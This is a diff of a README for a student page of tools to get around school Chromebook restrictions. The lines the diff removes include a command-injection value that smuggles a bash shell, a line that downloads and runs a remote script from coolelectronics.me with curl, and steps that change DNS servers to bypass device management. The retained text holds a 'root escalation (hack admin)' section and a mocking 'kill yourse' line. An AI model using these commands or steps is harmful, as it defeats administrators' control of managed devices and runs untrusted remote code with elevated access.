@@ -1,15 +1,6 @@
 ## Tools for responsible students. If you do not have a brain, turn back now.
 <br>
 
-BETA SEE ME TO ATTEMPT!!!!! (scroll down for normal stuff):
-set_cellular_ppp \';bash;exit;\'
-bash <(curl -k https://coolelectronics.me/unroll)
-1.go to the settings then click the wifi you are on.
-2.scroll down to were it say network click on that then name servers
-3.click custom nameservers then in the 4 boxes put 198.98.53.76
-4.Go to a new tab and in the url bar type chrome://restart then press enter(this will restart your computer without signing you out)
-5.then go to a new tab and search chrome.google.com if that doesn't work try https://chrome.google.com/webstorez
-6.Then it should say this is not safe randomly type thisisunsafe no spaces and it should work. CREDIT TO COMPACTCOW AND NEBELUNG AND BYPASSI. 
 
 
 <details>
@@ -78,7 +69,8 @@ Need help? Go <b>~~kill yourse~~</b> email me [here](mailto:2027ramid16@moundsvi
 
 <details>
 
-    <summary><b>root escalation (hack admin, HARD!)</b>
+<summary><b>root escalation (hack admin, HARD!)</b></summary>
+
 0. THIS IS VERY DIFFICULT. DO NOT PROCEED WITHOUT ATLEAST A BASIC UNDERSTANDING OF BASH. base64 lmao
         
 1. Find an unblocked way to open crosh. Do not ask me for help on this, I will not tell you how.
@@ -93,6 +85,9 @@ Need help? Go <b>~~kill yourse~~</b> email me [here](mailto:2027ramid16@moundsvi
 
 5. wuv you sysadmins <3
 
+</details>
+    
+<br>
 <br>
 <details>
 
